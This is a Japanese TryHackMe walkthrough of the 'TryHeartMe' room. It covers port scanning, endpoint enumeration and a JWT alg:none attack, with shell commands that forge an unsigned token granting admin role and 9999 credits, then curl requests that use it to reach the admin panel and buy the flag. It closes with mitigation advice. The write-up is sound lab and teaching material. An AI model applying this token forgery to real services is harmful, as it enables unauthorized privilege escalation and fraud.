---
author: "ijikeman"
showToc: true
TocOpen: true
title: "TryHackMe: TryHeartMe Walkthrough"
date: 2026-03-30T00:00:00+09:00
aliases: ["/TryHackMe/tryheartme"]
tags: ["TryHackMe", "CTF", "walkthrough", "JWT", "alg:none", "Web"]
categories: ["TryHackMe"]
draft: false
cover:
    image: "/images/eyecatch/TryHackMe/tryheartme/index.png"
---

# このページでわかること

* TryHackMe ルーム「TryHeartMe」のWalkthrough
* JWT（JSON Web Token）の構造とデコード方法
* `alg:none` 攻撃によるJWT署名検証バイパス
* JWT内のロール・クレジット情報の改ざんによる権限昇格
* curl を使った Cookie ベースの認証操作

# ルーム情報

| 項目 | 内容 |
|------|------|
| ルーム名 | TryHeartMe |
| 難易度 | Easy |
| カテゴリ | Web, JWT |
| URL | https://tryhackme.com/room/lafb2026e5 |

# 執筆時の環境

* OS: Kali Linux
* VPN: TryHackMe OpenVPN
* ツール: nmap, gobuster, curl

# 参考サイト

* [TryHackMe 公式](https://tryhackme.com/room/lafb2026e5)
* [PortSwigger - JWT attacks](https://portswigger.net/web-security/jwt)
* [jwt.io](https://jwt.io/)

---

# 1. 偵察 (Reconnaissance)

## 1-1. Nmap ポートスキャン

全ポートを対象にサービス・バージョンを調査する。

```bash
nmap -sC -sV -p- --min-rate 5000 10.144.189.104 -oN nmap/ports
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
```

* ポート22: SSH（OpenSSH 9.6p1）
* ポート5000: HTTP（Python Flask / Werkzeug 3.0.1）

Flask アプリがポート5000で動作していることを確認。ブラウザでアクセスするとバレンタインデーのギフトショップが表示された。

---

# 2. 列挙 (Enumeration)

## 2-1. Gobuster でエンドポイント列挙

```bash
gobuster dir -u http://10.144.189.104:5000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x py,txt,html,json,bak
```

発見したエンドポイント:

| エンドポイント | ステータス | 備考 |
|--------------|-----------|------|
| /login | 200 | ログインページ |
| /register | 200 | アカウント登録ページ |
| /account | 302 | `/login` へリダイレクト |
| /admin | 302 | `/login` へリダイレクト |
| /logout | 302 | ログアウト |

## 2-2. Webアプリの概要

ショップページには以下の商品が並んでいる。

| 商品名 | 価格 |
|--------|------|
| Rose Bouquet | 120 credits |
| Heart Chocolates | 85 credits |
| Chocolate-Dipped Strawberries | 60 credits |
| Love Letter Card | 25 credits |

購入にはアカウントとクレジットが必要。登録直後のクレジットは `0`。管理者パネル（`/admin`）は認証が必要で、通常ユーザではアクセスできない。

## 2-3. アカウント登録とJWT確認

`/register` に POST するとレスポンスの `Set-Cookie` ヘッダーに JWT が含まれる。

```bash
curl -v -X POST http://10.144.189.104:5000/register \
  -d "email=test@test.com&password=test123&next="
```

```
Set-Cookie: tryheartme_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
```

JWT はドット区切りの3パートで構成されている: `ヘッダー.ペイロード.署名`

---

# 3. 攻撃 (Exploitation) — JWT alg:none 攻撃

## 3-1. JWTペイロードのデコード

JWT の中央セグメント（ペイロード部分）を Base64 デコードして内容を確認する。

```bash
echo "eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImNyZWRpdHMiOjAsImlhdCI6MTc3NDg2MTYyNSwidGhlbWUiOiJ2YWxlbnRpbmUifQ" | base64 -d
```

```json
{"email":"test@test.com","role":"user","credits":0,"iat":1774861625,"theme":"valentine"}
```

`role` と `credits` がサーバサイドではなく JWT 内で管理されていることが判明した。つまり、JWT を改ざんできれば任意のロール・クレジット値を注入できる。

## 3-2. alg:none 攻撃の原理

JWT の `alg` フィールドを `none` に変更すると、一部の実装では署名検証をスキップする。この脆弱性を悪用すると、秘密鍵なしに任意のペイロードを含むトークンを偽造できる。

* **正規トークン**: `alg=HS256`（HMAC-SHA256で署名）
* **偽造トークン**: `alg=none`（署名検証なし、末尾の `.` のみ）

## 3-3. 改ざんJWTの生成

```bash
# ヘッダー: alg を none に変更
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')

# ペイロード: role を admin, credits を 9999 に改ざん
PAYLOAD=$(echo -n '{"email":"test@test.com","role":"admin","credits":9999,"iat":1774861625,"theme":"valentine"}' | base64 | tr -d '=' | tr '+/' '-_')

# 署名なしトークン（末尾の . が必須）
TOKEN="${HEADER}.${PAYLOAD}."

echo $TOKEN
```

Base64url エンコードの注意点:
* パディング文字 `=` を除去する (`tr -d '='`)
* `+` を `-` に、`/` を `_` に変換する (`tr '+/' '-_'`)
* 末尾の `.` を必ず付ける（署名部分が空であることを示す）

## 3-4. 改ざんトークンでアクセス確認

```bash
curl -s http://10.144.189.104:5000/ \
  -H "Cookie: tryheartme_jwt=${TOKEN}"
```

レスポンスを確認すると:
* ナビゲーションに `/admin` リンクが出現
* Credits: `9999` に変化
* 隠し商品 `ValenFlag (777 credits)` が出現

## 3-5. 管理者パネルの確認

```bash
curl -s http://10.144.189.104:5000/admin \
  -H "Cookie: tryheartme_jwt=${TOKEN}"
```

```
Staff session detected. Staff can purchase the ValenFlag item.
```

管理者として認証されたことを確認した。

---

# 4. フラグ取得

## 4-1. ValenFlag を購入する

ValenFlag を購入するために `/buy/valenflag` へ POST リクエストを送る。

```bash
curl -v -X POST http://10.144.189.104:5000/buy/valenflag \
  -H "Cookie: tryheartme_jwt=${TOKEN}"
```

```
< HTTP/1.1 302 FOUND
< Location: /receipt/valenflag
< Set-Cookie: tryheartme_jwt=<新しいJWT>
```

購入が成功すると `/receipt/valenflag` へ 302 リダイレクトが返り、新しい JWT が発行される。

> **ハマりポイント**: `-L` オプション（リダイレクト追従）を付けると 405 Method Not Allowed エラーになる。これは curl がリダイレクト先に対しても POST を送ってしまうためだ。`-L` は使わず、レスポンスヘッダーから新しい JWT を手動で取得してレシートページにアクセスすること。

## 4-2. レシートページでフラグを確認

購入レスポンスの `Set-Cookie` から新しい JWT を取得し、レシートページへアクセスする。

```bash
# 新しい JWT をコピーして変数に代入
NEW_TOKEN="<購入後に発行された新JWT>"

curl -s http://10.144.189.104:5000/receipt/valenflag \
  -H "Cookie: tryheartme_jwt=${NEW_TOKEN}"
```

レシートページにフラグが表示された。

| フラグ | 取得方法 |
|--------|----------|
| THM{...} | ValenFlag 購入後のレシートページ |

---

# まとめ

このルームでは、JWT の `alg:none` 攻撃を通じて以下のことを学べた。

## 学べること

| テーマ | 内容 |
|--------|------|
| JWTの構造 | ヘッダー・ペイロード・署名の3パート構成と Base64url エンコード |
| alg:none 攻撃 | アルゴリズムを `none` にすることで署名検証をスキップできる実装の脆弱性 |
| 権限昇格 | JWT 内の `role` フィールドを改ざんして管理者権限を取得 |
| curl の挙動 | `-L` によるリダイレクト追従が POST メソッドに影響を与えるケース |

## 対策のポイント

* JWT のアルゴリズムはサーバ側で厳密に固定し、`none` を許可しない
* ロール・クレジット等のユーザ状態はサーバサイドで管理し、JWT に持たせない
* JWT ライブラリは最新バージョンを使用し、`alg:none` が無効化されていることを確認する
